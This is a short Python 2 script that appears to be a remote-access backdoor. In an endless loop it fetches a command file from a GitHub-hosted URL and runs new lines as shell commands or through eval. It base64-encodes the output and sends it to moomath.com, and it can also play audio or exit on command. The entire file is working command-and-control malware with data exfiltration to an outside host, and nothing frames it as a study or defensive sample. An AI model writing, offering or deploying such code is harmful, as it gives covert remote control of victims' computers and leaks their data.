import os
import urllib2
import time
import base64
import sys

oldjp = []

while (True):
    jp = urllib2.urlopen("https://raw.githubusercontent.com/anematode/nichodon.github.io/master/other/nico.txt")

    oldjpdup = []
    i = 0
    
    for line in jp:
        oldjpdup.append(line)

        if (i < len(oldjp) and line == oldjp[i]):
            i += 1
            continue

        i += 1
        if (line[:5] == 'bash:'):
            result = base64.encodestring(os.popen(line[5:].lstrip()).read()).replace('+','-').replace('/','_')
            try:
                urllib2.urlopen("http://moomath.com/udderJS.php?" + result)
            except:
                pass
        elif (line[:5] == 'exec:'):
            result = base64.encodestring(eval(line[5:])).replace('+','-').replace('/','_')
            try:
                urllib2.urlopen("http://moomath.com/udderJS.php?" + result)
            except:
                pass
        elif (line[:5] == 'nash:'):
            os.system(line[5:])
        elif (line[:5] == 'play:'):
            os.system("afplay " + line[5:].lstrip())
        elif (line[:5] == 'stop:'):
            sys.exit()

    oldjp = oldjpdup
    time.sleep(1)
